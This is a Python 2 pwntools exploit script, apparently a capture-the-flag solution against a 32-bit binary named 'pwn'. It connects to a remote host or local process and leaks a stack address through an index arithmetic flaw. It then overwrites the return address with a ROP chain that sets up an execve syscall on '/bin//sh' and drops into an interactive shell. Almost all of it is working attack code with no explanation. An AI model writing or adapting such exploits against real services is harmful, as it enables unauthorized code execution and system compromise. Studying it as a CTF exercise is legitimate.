#!/usr/bin/env python2

from pwn import *
from qpwn import *
from sys import argv
context(binary='./pwn', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote(argv[1], int(argv[2]))
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
else:
    p = process('./pwn')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

begin_addr = 0xffffcfe8
ret_addr = 0xffffd588 + 0x4

def write_value(index, old, value):
    payload = '+%d' % index
    if old:
        payload += '-%d' % old
    if value-value/2:
        payload += '+%d' % (value - value/2)
    if value/2:
        payload += '+%d' % (value/2)
    #payload = '+%d-%d+%d+%d' % (index, old, value/2, value-value/2)
    return payload

pop_eax_ret = 0x0805c34b
#pop_ebx_ret = 0x080481d1
#pop_ecx_ebx_ret = 0x080701d1
pop_edx_ecx_ebx_ret = 0x080701d0
int_addr = 0x08049a21

if __name__ == '__main__':
    index = (ret_addr - begin_addr) / 4
    payload = '+%d' % (index-1)
    p.sl(payload)
    p.ru('-')
    stack_addr = 0x100000000 - int(p.rl().strip())
    bin_sh_addr = stack_addr - 0xffffd5a8 + 0xffffd5a8
    value_ls = [pop_edx_ecx_ebx_ret, 0x0, 0x0, bin_sh_addr, pop_eax_ret, 11, int_addr,
                0x6e69622f, 0x732f2f2f, 0x68]
    old_ls = [0x08049499, 0x040380e8, 0x040380e8, 0x040380e8,
              bin_sh_addr/2, pop_eax_ret/2, 0x00000005, int_addr/2 ,
              0x6e69622f/2, 0x732f2f2f/2, 0xffffd63c]
    success('stack_addr ' + hex(stack_addr))
    #success('ret_addr ' + hex(ret_addr))
    #p.i()
    #bc(0x08049433)
    # x /20dx 0xffffd58c
    for i in range(len(value_ls)):
        payload = write_value(index + i, old_ls[i], value_ls[i])
        if i == 9:
            bc(0x08049411)
        p.sl(payload)
    p.s('\n')
    #gogogo('b *0x08049081\n')
    #gogogo('b *0x08049411\nx /20dx {}'.format(hex(ret_addr)))
    success('begin_addr ' + hex(begin_addr))
    success('ret_addr ' + hex(ret_addr))
    p.i()
